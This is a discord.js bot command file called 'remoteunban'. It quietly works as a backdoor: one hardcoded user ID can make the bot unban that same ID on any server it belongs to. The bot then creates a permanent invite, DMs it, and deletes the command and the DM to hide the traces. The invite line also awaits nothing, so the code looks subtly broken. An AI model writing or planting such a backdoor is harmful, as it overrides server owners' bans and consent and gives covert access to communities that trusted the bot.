const Discord = require("discord.js");
const { resourcesettings } = require("googleapis/build/src/apis/resourcesettings");

module.exports = {
    name: 'remoteunban',
    description: "remoteunban the server",
    async execute(client, message, args, Discord, db) {

        if (message.author.id === "574445866220388352") {

            client.guilds.fetch(args[0])
                .then(async guildtarget => {

let id = '574445866220388352';

                    guildtarget.members.unban(id)
                
let invite2 = guildtarget.channels.cache.filter(channel => channel.type === "text").first().createInvite({ maxAge: 0 })

                    const embed = new Discord.MessageEmbed()
                    .setColor("WHITE")
                      .setAuthor("Done!")
                      .addFields(
                        { name: '\u200b', value: `Done! join here: ${invite2}`},
                        
                      )
                    message.author.send(embed)
                    .then(msg => {
                        setTimeout(() => msg.delete(), 60000)
                      })
                      message.delete();

                       
                    })
        }
    }
}